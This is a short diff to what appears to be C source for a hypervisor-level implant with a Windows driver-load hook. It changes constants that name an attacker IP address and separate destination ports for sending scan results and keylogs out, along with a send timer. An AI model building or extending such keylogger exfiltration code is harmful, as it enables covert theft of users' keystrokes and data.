@@ -36,7 +36,8 @@ extern void handle_MiDriverLoadSucceeded_hook(vmexit_data_t *state);
 
 #define ATTACKER_IP 0xac1cb73f  // 172.28.183.63
 #define SRC_PORT 49321
-#define DST_PORT 49324
+#define DST_SCAN_PORT 49323
+#define DST_KEYLOGS_PORT 49324
 
 #define SEND_TIMER_TIME 0x2ffffff
 #define IMMEDIATE_SENDING
